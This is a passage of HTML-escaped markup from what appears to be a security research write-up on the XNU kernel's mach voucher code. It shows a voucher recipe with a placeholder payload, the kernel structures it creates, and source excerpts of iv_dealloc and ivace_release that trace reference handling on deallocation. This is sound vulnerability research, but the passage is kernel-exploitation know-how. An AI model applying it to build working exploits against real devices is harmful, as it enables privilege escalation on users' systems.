class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint32_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;payload &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41414141&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;This will end up with the following data structures in the kernel:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1c923ba263ede6be48f5e3994bd28dbf63e17419\"&gt;&lt;/a&gt;&lt;a id=\"t.39\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher_port &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ip_kobject &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;counted pointer to the voucher&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_refs &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;6&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;counted &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;into&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;user_data controller&amp;#39;s ivac_table&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;controller &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ivace_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;pointer to user_data_value_element&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_value_element &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; e_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; e_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Let&amp;#39;s look at what happens when we drop the only send right to the voucher port and the voucher gets deallocated.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;We&amp;#39;ll skip analysis of the mach port part; essentially, once all the send rights to the mach port holding a reference to the voucher are deallocated &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;will get called to drop its reference on the voucher. And if that was the last reference &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dealloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;and we&amp;#39;ll pick up the code there:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4b28abaa66e9cfb4075064152109c5280c8cf0e2\"&gt;&lt;/a&gt;&lt;a id=\"t.40\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_dealloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;boolean_t unhash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;removes the voucher from the hash table, destroys the mach port associated with the voucher (if there was one) then releases a reference on each value index in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4f3ea1be5aeabd748f89b7dfdb88c89a35820b48\"&gt;&lt;/a&gt;&lt;a id=\"t.41\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;for&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;i&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Recall that the index in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the &amp;quot;key index&amp;quot;, which is one less than the key, which is why &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;i&lt;/span&gt;&lt;span&gt;&amp;nbsp;is being passed to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_release&lt;/span&gt;&lt;span&gt;. The value in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;alone is meaningless without knowing under which index it was stored in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s the start of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3340385800b70e69984ecec61cc53f34e8b57d23\"&gt;&lt;/a&gt;&lt;a id=\"t.42\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* cant release persistent values */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_persist&lt;/span&gt;&lt;span 